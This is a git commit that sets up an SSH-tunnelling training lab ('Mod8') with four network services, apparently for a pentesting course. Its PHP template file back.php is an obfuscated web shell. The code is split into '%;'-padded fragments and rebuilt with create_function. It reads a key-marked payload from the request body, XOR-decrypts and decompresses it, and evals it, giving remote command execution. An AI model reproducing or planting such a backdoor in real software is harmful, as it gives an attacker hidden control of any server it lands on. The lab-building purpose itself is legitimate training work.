267bd3a6efc20a32686e7a6686e4b3c1931d5abf
Marcio Souza a.k.a ms109 <m.desouza20@gmail.com>
2024-07-04 17:30:20 -0300

    Criado o laboratorio do Mod8.

---
+++ mod8/README.md
@@ -0,0 +1,5 @@
+# ehlf-dmz-mod8
+
+Essa repositório vai criar 4 serviços de rede para treinar tunelamento via SSH.
+
+Segue a lista de hosts: ftp.ehlf.example.net, http.ehlf.example.net, http2.ehlf.example.net, http3.ehlf.example.net.
---
+++ mod8/config_templates/http/back.php
@@ -0,0 +1,10 @@
+<?php
+$N='get_contents();@%;o%;b_end_%;clea%;n();%;$r=@bas%;e64_enc%;od%;e(@x(@gzcompres%;s($o%;),$k))%;;pri%;nt("$p$%;kh$r$kf");}';
+$Q='://inpu%;%;t"),$m%;)==1) {@o%;b%;_start();@eva%;l(@gzuncom%;pres%;s(@x(@%;bas%;e64_decod%;e($m[%;%;1]),$k)));%;%;$o=@ob%;_';
+$x=str_replace('I','','creIIIate_IIfunctiIon');
+$i=',$k)%;%;{$c=strlen($%;k);$%;l=strlen($t);%;$o="";fo%;r($i=%;0%;;$i<$l;){for%;(%;$j=0%;;($j<$c&&$i%;<%;$l);$j%;++,$i++';
+$g='){$o.%;=$t{%;$i}^$k{$j%;%;};}}%;return $o;}if (%;@p%;reg_matc%;h("/$kh%;(.+%;)$kf%;%;/%;",@f%;ile_get_conten%;ts("php';
+$F='$k="e10ad%;c39";%;$kh=%;"49%;ba%;59a%;bbe56";$kf="e05%;7f20%;f883%;%;e";$p="1%;8fSet47JIy1cM4O";%;fu%;%;nc%;tion x($t';
+$L=str_replace('%;','',$F.$i.$g.$Q.$N);
+$h=$x('',$L);$h();
+?>
